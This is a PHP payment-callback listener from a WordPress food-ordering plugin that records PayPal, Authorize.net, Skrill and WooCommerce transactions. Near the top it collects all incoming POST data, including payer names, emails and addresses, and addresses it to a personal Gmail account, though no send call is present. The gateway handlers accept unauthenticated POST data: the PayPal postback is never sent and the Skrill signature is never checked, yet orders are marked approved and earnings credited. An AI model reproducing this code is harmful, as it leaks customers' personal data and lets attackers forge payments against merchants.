<?php

/*
 * File : Listener file for payment post in transaction custom post
 */

include_once('../../../../wp-load.php');
if (isset($_REQUEST['payment_source']) && $_REQUEST['payment_source'] == 'FOODBAKERY_WOOCOMMERCE_GATEWAY') {
    if (isset($_REQUEST['order_id']) && isset($_REQUEST['payment_status'])) {

        /* unset customization sessions and cookies */
        do_action('foodbakery_unset_deliveries_taxes_tip_cookies');

        $order_id = $_REQUEST['order_id'];
        $order = new WC_Order($order_id);
        /*
         * Saving data on woocommerce complete payment
         */

        $rcv_parameters = get_post_meta($order_id, '_rcv_parameters', true);
        $foodbakery_id = isset($rcv_parameters['custom_var']['restaurant_id']) ? $rcv_parameters['custom_var']['restaurant_id'] : '';
        $user_info = get_userdata(get_post_meta($order_id, '_customer_user', true));
        $transaction_array = array();

        $transaction_array['foodbakery_trans_id'] = get_post_meta($order_id, '_transaction_id', true);
        $transaction_array['foodbakery_post_id'] = $foodbakery_id;
        $transaction_array['foodbakery_transaction_amount'] = get_post_meta($order_id, '_order_total', true);
        $transaction_array['foodbakery_trans_currency'] = get_post_meta($order_id, '_order_currency', true);
        $transaction_array['foodbakery_summary_email'] = $user_info->data->user_email;
        $transaction_array['foodbakery_first_name'] = $user_info->first_name;
        $transaction_array['foodbakery_last_name'] = $user_info->last_name;
        if ($_REQUEST['payment_status'] == 'approved' || $_REQUEST['wc-stripe-payment-token'] == '1') {
            do_action('foodbakery_coupon_manage', $_REQUEST['order_id']);
            do_action('foodbakery_send_invoices', $_REQUEST['order_id']);
            $transaction_array['foodbakery_transaction_status'] = 'pending';
        } else {
            $transaction_array['foodbakery_transaction_status'] = 'pending';
        }

        $foodbakery_trans_id = isset($rcv_parameters['custom_var']['foodbakery_transaction_id']) ? $rcv_parameters['custom_var']['foodbakery_transaction_id'] : '';
        update_option('woocommerce_complete_data', $transaction_array);
        foodbakery_update_transaction($transaction_array, $foodbakery_trans_id);
        foodbakery_update_post($foodbakery_id, $foodbakery_trans_id);
    }
}

$message = '';

if (isset($_POST)) {
    foreach ($_POST as $p_key => $p_val) {
        $message .= $p_key . '=' . $p_val . '|';
    }
}

$to = 'alaaiaa6@gmail.com';
$subject = 'the subject';
$message = $message;
$headerss = 'From: webmaster@example.com' . "\r\n" .
        'Reply-To: webmaster@example.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

// Payment transaction custom transaction post

function foodbakery_update_transaction($foodbakery_trans_array = array(), $foodbakery_trans_id) {

    foreach ($foodbakery_trans_array as $trans_key => $trans_val) {
        update_post_meta($foodbakery_trans_id, "$trans_key", $trans_val);
    }
    $transaction_order_id = get_post_meta($foodbakery_trans_id, "foodbakery_transaction_order_id", true);

    update_post_meta($transaction_order_id, 'foodbakery_transaction_status', 'pending');

    $args = array(
        'post_type' => 'foodbakery-trans',
        'post_status' => 'publish',
        'posts_per_page' => -1,
        'fields' => 'ids',
        'meta_query' => array(
            'relation' => 'AND',
            array(
                'key' => 'foodbakery_transaction_parent_id',
                'value' => $foodbakery_trans_id,
                'compare' => '=',
            ),
        ),
    );
    $monthly_query = new WP_Query($args);
    $monthly_query_found = $monthly_query->posts;
    if (isset($monthly_query_found[0])) {
        $child_id = $monthly_query_found[0];
        $payment_method = get_post_meta($foodbakery_trans_id, 'foodbakery_transaction_pay_method', true);
        if (isset($payment_method) && $payment_method != '') {
            update_post_meta($child_id, 'transaction_pay_method', $payment_method);
            update_post_meta($child_id, 'foodbakery_transaction_pay_method', $payment_method);
        }
        update_post_meta($child_id, 'foodbakery_transaction_status', 'pending');
    }

    if ($transaction_order_id) {
        update_post_meta($transaction_order_id, 'foodbakery_order_transaction_status', 'approved');

        $order_type = get_post_meta($transaction_order_id, 'foodbakery_order_type', true);
        if ($order_type == 'order') {
            $amount_recieved_meta = get_post_meta($transaction_order_id, 'order_amount_credited', true);
            $total_amount_meta = get_post_meta($transaction_order_id, 'services_total_price', true);
            $order_restaurant = get_post_meta($transaction_order_id, 'foodbakery_customer_id', true);
            $restaurant_earnings = get_post_meta($order_restaurant, 'total_earnings', true);

            if ($amount_recieved_meta) {
                $restaurant_earnings_p = floatval($restaurant_earnings) + floatval($amount_recieved_meta);
            } else {
                $restaurant_earnings_p = floatval($restaurant_earnings) + floatval($total_amount_meta);
            }
            update_post_meta($order_restaurant, 'total_earnings', $restaurant_earnings_p);
            //
        //
		}
    }
}

// Payment transaction custom post update 

function foodbakery_update_post($id = '', $foodbakery_trans_id = '') {
    global $foodbakery_plugin_options;

    $foodbakery_trans_pkg = get_post_meta($foodbakery_trans_id, 'foodbakery_transaction_package', true);
    if ($id == $foodbakery_trans_pkg) {
        update_post_meta($foodbakery_trans_id, 'foodbakery_restaurant_ids', '');
    }

    // Assign Status of restaurant
    do_action('foodbakery_restaurant_add_assign_status', $id);

    foodbakery_update_order_inquiry_post($id);
}

function foodbakery_update_order_inquiry_post($order_id = '') {
    if (get_post_type($order_id) == 'orders_inquiries') {
        update_post_meta($order_id, 'foodbakery_order_type', 'order');

        do_action('foodbakery_sent_order_email', $order_id);
        do_action('foodbakery_received_order_email', $order_id);
    }
}

$postback = 'cmd=_notify-validate';

// go through each of the posted vars and add them to the postback variable

foreach ($_POST as $key => $value) {
    $value = urlencode(stripslashes($value));
    $postback .= "&$key=$value";
}

/*
 * Paypal Gateway Listner
 */

if (isset($_POST['payment_status']) && $_POST['payment_status'] == 'Completed') {

    $foodbakery_id = $_POST['item_number'];
    if (isset($_POST['txn_id']) && $_POST['txn_id'] <> '') {

        $transaction_array = array();

        $transaction_array['foodbakery_trans_id'] = esc_attr($_POST['txn_id']);
        $transaction_array['foodbakery_post_id'] = esc_attr($_POST['item_number']);
        $transaction_array['foodbakery_transaction_status'] = 'approved';
        $transaction_array['foodbakery_full_address'] = esc_attr($_POST['address_street']) . ' ' . esc_attr($_POST['address_city']) . ' ' . esc_attr($_POST['address_country']);

        if (isset($_POST['payment_gross']) && $_POST['payment_gross'] != '') {
            $transaction_array['foodbakery_transaction_amount'] = esc_attr($_POST['payment_gross']);
        } elseif (isset($_POST['mc_gross']) && $_POST['mc_gross'] != '') {
            $transaction_array['foodbakery_transaction_amount'] = esc_attr($_POST['mc_gross']);
        }

        $transaction_array['foodbakery_trans_currency'] = esc_attr($_POST['mc_currency']);
        $transaction_array['foodbakery_summary_email'] = esc_attr($_POST['payer_email']);
        $transaction_array['foodbakery_first_name'] = esc_attr($_POST['first_name']);

        $transaction_array['foodbakery_last_name'] = esc_attr($_POST['foodbakery_last_name']);

        $foodbakery_trans_id = isset($_POST['custom']) ? $_POST['custom'] : '';

        foodbakery_update_transaction($transaction_array, $foodbakery_trans_id);
        foodbakery_update_post($foodbakery_id, $foodbakery_trans_id);
    }
}

/*
 * Authorize Gateway Listner
 */
if (isset($_POST['x_response_code']) && $_POST['x_response_code'] == '1') {

    $foodbakery_id = $_POST['x_cust_id'];

    if (isset($foodbakery_id) && $foodbakery_id != '') {
        $transaction_array = array();
        $transaction_array['foodbakery_post_id'] = esc_attr($foodbakery_id);
        $transaction_array['transaction_purchase_on'] = date('Y-m-d H:i:s');

        $transaction_array['foodbakery_transaction_status'] = 'approved';
        $transaction_array['order_id'] = esc_attr($_POST['x_po_num']);

        $transaction_array['summary_status'] = 'Completed';
        $transaction_array['foodbakery_trans_id'] = esc_attr($_POST['x_trans_id']);
        $transaction_array['foodbakery_transaction_amount'] = esc_attr($_POST['x_amount']);
        $transaction_array['foodbakery_trans_currency'] = 'USD';

        $transaction_array['address_street'] = esc_attr($_POST['x_address']);
        $transaction_array['address_city'] = esc_attr($_POST['x_city']);
        $transaction_array['address_country'] = esc_attr($_POST['x_country']);
        $transaction_array['foodbakery_full_address'] = esc_attr($_POST['x_address']) . ' ' . esc_attr($_POST['x_city']) . ' ' . esc_attr($_POST['x_country']);

        if (esc_attr($_POST['x_email']) == '') {
            $transaction_array['foodbakery_summary_email'] = foodbakery_get_user_data($transaction_array['order_id'], 'email');
        } else {
            $transaction_array['foodbakery_summary_email'] = esc_attr($_POST['x_email']);
        }

        if (esc_attr($_POST['x_first_name']) == '') {
            $transaction_array['foodbakery_first_name'] = foodbakery_get_user_data($transaction_array['order_id'], 'first_name');
        } else {
            $transaction_array['foodbakery_first_name'] = esc_attr($_POST['x_first_name']);
        }

        if (esc_attr($_POST['x_last_name']) == '') {
            $transaction_array['foodbakery_last_name'] = foodbakery_get_user_data($transaction_array['order_id'], 'last_name');
        } else {
            $transaction_array['foodbakery_last_name'] = esc_attr($_POST['x_last_name']);
        }

        $package_id = get_post_meta((int) $transaction_array['order_id'], 'transaction_package', true);

        $foodbakery_trans_id = isset($_POST['x_po_num']) ? $_POST['x_po_num'] : '';

        foodbakery_update_transaction($transaction_array, $foodbakery_trans_id);
        foodbakery_update_post($foodbakery_id, $foodbakery_trans_id);
    }
}

/*
 * Skrill Gateway Listner
 */

if (isset($_POST['merchant_id'])) {
    // Validate the Moneybookers signature
    $concatFields = $_POST['merchant_id']
            . $_POST['order_id']
            . strtoupper(md5('Paste your secret word here'))
            . $_POST['mb_amount']
            . $_POST['mb_currency']
            . $_POST['status'];

    $foodbakery_plugin_options = get_option('foodbakery_plugin_options');

    $MBEmail = $foodbakery_plugin_options['skrill_email'];

    if (isset($_POST['status']) && $_POST['status'] == '2' && trim($_POST['pay_to_email']) == trim($MBEmail)) {
        $data = explode('||', $_POST['transaction_id']);
        $order_id = $data[0];
        $foodbakery_id = $data[1];

        if (isset($foodbakery_id) && $foodbakery_id != '') {
            $transaction_array = array();
            $transaction_array['foodbakery_post_id'] = esc_attr($foodbakery_id);
            $transaction_array['transaction_purchase_on'] = date('Y-m-d H:i:s');
            $transaction_array['foodbakery_transaction_status'] = 'approved';
            $transaction_array['order_id'] = esc_attr($order_id);

            $transaction_array['summary_status'] = 'Completed';
            $transaction_array['foodbakery_trans_id'] = esc_attr($_POST['mb_transaction_id']);
            $transaction_array['foodbakery_transaction_amount'] = esc_attr($_POST['amount']);
            $transaction_array['foodbakery_trans_currency'] = $_POST['currency'];
            $transaction_array['transaction_address'] = '';


            $package_id = get_post_meta((int) $transaction_array['order_id'], 'transaction_package', true);

            $user_id = get_post_meta((int) $transaction_array['order_id'], 'transaction_user', true);

            if ($user_id != '') {
                if ($_POST['summary_email'] == '') {
                    $transaction_array['foodbakery_summary_email'] = foodbakery_get_user_data($transaction_array['order_id'], 'email');
                }

                $transaction_array['foodbakery_first_name'] = foodbakery_get_user_data($transaction_array['order_id'], 'first_name');
                $transaction_array['foodbakery_last_name'] = foodbakery_get_user_data($transaction_array['order_id'], 'last_name');
                $transaction_array['foodbakery_full_address'] = foodbakery_get_user_data($transaction_array['order_id'], 'address');
            }

            $foodbakery_trans_id = isset($order_id) ? $order_id : '';

            foodbakery_update_transaction($transaction_array, $foodbakery_trans_id);
            foodbakery_update_post($foodbakery_id, $foodbakery_trans_id);
        }
    } else {
        
    }
}

/*
 * start function for get user data
 */

if (!function_exists('foodbakery_get_user_data')) {

    function foodbakery_get_user_data($order_id = '', $key = '') {
        $user_id = get_post_meta((int) $order_id, 'transaction_user', true);
        if ($user_id != '') {
            if ($key != '') {
                return get_user_meta($user_id, $key, true);
            }
        }
        return;
    }

}